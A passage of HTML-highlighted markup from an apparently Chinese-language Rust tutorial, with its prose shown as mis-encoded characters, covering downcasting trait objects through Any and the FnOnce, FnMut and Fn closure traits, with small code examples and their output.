&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">new&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nc">ConcreteCounter&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">ConcreteCounter&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">count&lt;/span>: &lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Counter&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ConcreteCounter&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">inc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;count: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">as_any_mut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">dyn&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Any&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">counter&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ConcreteCounter&lt;/span>::&lt;span class="n">new&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">dyn_counter&lt;/span>: &lt;span class="nb">Box&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="k">dyn&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Counter&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Box&lt;/span>::&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">counter&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// counter: &amp;amp;mut ConcreteCounter
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">counter&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">dyn_counter&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">as_any_mut&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">downcast_mut&lt;/span>::&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">ConcreteCounter&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">expect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;dyn_counter is not a ConcreteCounter&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">counter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">inc&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">counter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">counter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">inc&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">count: 2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">count: 1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¤§æ¦‚æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;code>Box&amp;lt;dyn Counter&amp;gt;&lt;/code> â†’ &lt;code>&amp;amp;mut dyn Any&lt;/code> (æˆ–è€… &lt;code>&amp;amp;dyn Any&lt;/code>, å¦‚æœä¸éœ€è¦å¯å˜å¼•ç”¨)&lt;/p>
&lt;p>è¿™é‡Œéœ€è¦ &lt;code>Counter&lt;/code> åŒ…å«ä¸€ä¸ª &lt;code>as_any_mut&lt;/code> æ–¹æ³•ï¼Œä»¥ä¾¿åœ¨ &lt;code>ConcreteCounter&lt;/code> ä¸­å®ç°ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>&amp;amp;mut dyn Any&lt;/code> â†’ &lt;code>&amp;amp;mut ConcreteCounter&lt;/code>&lt;/p>
&lt;p>è¿™æ˜¯é€šè¿‡è°ƒç”¨ &lt;code>Any&lt;/code> çš„ &lt;code>downcast_mut&lt;/code> (å¯¹åº”ä¸å¯å˜å¼•ç”¨æ˜¯ &lt;code>downcast_ref&lt;/code>) æ–¹æ³•å®ç°çš„ã€‚&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>ç±»ä¼¼åœ°ï¼Œ &lt;code>&amp;amp;dyn Trait&lt;/code> ä¹Ÿå¯ä»¥é€šè¿‡ä¸Šè¿°æ–¹æ³•æ¥è·å–å…¶åº•å±‚å…·ä½“çš„ struct çš„å¼•ç”¨ã€‚&lt;/p>
&lt;h2 id="trait-å’Œé—­åŒ…">Trait å’Œé—­åŒ…&lt;/h2>
&lt;p>æ ¹æ®é—­åŒ… (closure) å¤„ç†å‚æ•°çš„æ–¹å¼ï¼Œé—­åŒ…ä¼šè‡ªåŠ¨å®ç°ä»¥ä¸‹ä¸‰ä¸ª &lt;code>Fn&lt;/code> traits ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;code>FnOnce&lt;/code> é€‚ç”¨äºå¯ä»¥è°ƒç”¨ä¸€æ¬¡çš„é—­åŒ…ã€‚æ‰€æœ‰é—­åŒ…éƒ½ä¼šè‡³å°‘å®ç°è¯¥ trait, å› ä¸ºæ‰€æœ‰çš„é—­åŒ…éƒ½å¯ä»¥è¢«è°ƒç”¨ã€‚&lt;/p>
&lt;p>ä¸€ä¸ªé—­åŒ…å¦‚æœå°†æ•è·çš„å€¼ move åˆ°é—­åŒ…å¤–éƒ¨ï¼Œåˆ™è¯¥é—­åŒ…å°†ä»…å®ç°è¯¥ &lt;code>FnOnce&lt;/code> è€Œä¸ä¼šå®ç°å…¶ä»– &lt;code>Fn&lt;/code> traits, å› ä¸ºè¯¥é—­åŒ…åªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>FnMut&lt;/code> é€‚ç”¨äºå¦‚ä¸‹é—­åŒ…ï¼šè¿™ç±»é—­åŒ…ä¸ä¼šå°†æ•è·çš„å€¼ move åˆ°é—­åŒ…å¤–éƒ¨ï¼Œä½†å¯èƒ½ä¼šä¿®æ”¹æ•è·çš„å€¼ã€‚è¿™ç±»é—­åŒ…å¯ä»¥è¢«è°ƒç”¨å¤šæ¬¡ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>Fn&lt;/code> é€‚ç”¨äºå¦‚ä¸‹é—­åŒ…ï¼šè¿™ç±»é—­åŒ…ä¸ä¼šå°†æ•è·çš„å€¼ move åˆ°é—­åŒ…å¤–éƒ¨ï¼Œä¹Ÿä¸ä¼šä¿®æ”¹æ•è·çš„å€¼ï¼Œæˆ–è€…æ ¹æœ¬ä¸æ•è·ä»»ä½•å€¼ã€‚&lt;/p>
&lt;p>è¿™ç±»é—­åŒ…å¯ä»¥è¢«è°ƒç”¨å¤šæ¬¡ï¼Œä¸”ä¸ä¼šä¿®æ”¹ç¯å¢ƒï¼ˆå¯¹ç¯å¢ƒæ— å‰¯ä½œç”¨ï¼‰ï¼Œè¿™åœ¨å¹¶å‘å¤šæ¬¡è°ƒç”¨é—­åŒ…ç­‰åœºæ™¯ä¸‹éå¸¸é‡è¦ã€‚&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>ä»¥ä¸Š trait å¯¹é—­åŒ…çš„è¦æ±‚æŒ‰ç…§é¡ºåºé€æ¸é€’å¢ï¼š &lt;code>FnOnce&lt;/code> å¯¹é—­åŒ…æ²¡æœ‰ä»»ä½•ç‰¹æ®Šè¦æ±‚ï¼Œè€Œ &lt;code>Fn&lt;/code>
çš„è¦æ±‚æœ€ä¸¥æ ¼ã€‚&lt;/p>
&lt;h3 id="fnonce-çš„ä¾‹å­">&lt;code>FnOnce&lt;/code> çš„ä¾‹å­&lt;/h3>
&lt;p>&lt;code>Option&amp;lt;T&amp;gt;.unwrap_or_else&lt;/code> æ–¹æ³•ä¸­çš„é—­åŒ…å‚æ•°å°±å£°æ˜äº† &lt;code>FnOnce&lt;/code> çº¦æŸï¼Œæ„å‘³ç€è¯¥æ–¹æ³•å¯ä»¥æ¥å—ä»»æ„ç±»å‹çš„é—­åŒ…ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">impl&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Option&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">unwrap_or_else&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">f&lt;/span>: &lt;span class="nc">F&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nc">T&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">F&lt;/span>: &lt;span class="nb">FnOnce&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nc">T&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">match&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Some&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">None&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>ğŸ’¡ ä¸€ä¸ªæ™®é€šå‡½æ•°ä¹Ÿå¯ä»¥å®ç°å…¨éƒ¨ä¸‰ä¸ª &lt;code>Fn&lt;/code> traitsã€‚&lt;/p>
&lt;p>å¦‚æœä¸éœ€è¦ä»ç¯å¢ƒä¸­æ•è·å€¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨éœ€è¦ä¼ å…¥æŸä¸ª &lt;code>Fn&lt;/code> trait çš„åœ°æ–¹ä½¿ç”¨å‡½æ•°åè€Œéé—­åŒ…ã€‚ä¾‹å¦‚ï¼šåœ¨ä¸€ä¸ª &lt;code>Option&amp;lt;Vec&amp;lt;T&amp;gt;&amp;gt;&lt;/code> ä¸Šè°ƒç”¨ &lt;code>unwrap_or_else(Vec::new)&lt;/code>, å½“è¯¥ option ä¸º
&lt;code>None&lt;/code> æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ä¸€ä¸ªæ–°çš„ç©º vectorã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="fnmut-çš„ä¾‹å­">&lt;code>FnMut&lt;/code> çš„ä¾‹å­&lt;/h3>
&lt;p>ä¸‹é¢çš„ç¤ºä¾‹æ¼”ç¤ºäº†é€šè¿‡ &lt;code>sort_by_key&lt;/code> æ–¹æ³•ç»™æ•°ç»„æ’åºã€‚è¯¥æ–¹æ³•æ¥å— &lt;code>FnMut&lt;/code> é—­åŒ… (æˆ–è€… &lt;code>Fn&lt;/code>
é—­åŒ…), åŸå› æ˜¯å®ƒä¼šè°ƒç”¨è¯¥é—­åŒ…å¤šæ¬¡ï¼Œæ¯ä¸ª item ä¸€æ¬¡ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#[derive(Debug)]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="kt">u32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">},&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="mi">5&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">},&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Rectangle&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">width&lt;/span>: &lt;span class="mi">7&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">height&lt;/span>: &lt;span class="mi">12&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">},&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sort_by_key&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">width&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="si">{:#?}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">[
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Rectangle {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> width: 3,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> height: 5,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> },
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Rectangle {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> width: 7,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> height: 12,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> },
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Rectangle {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> width: 10,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> height: 1,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> },
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
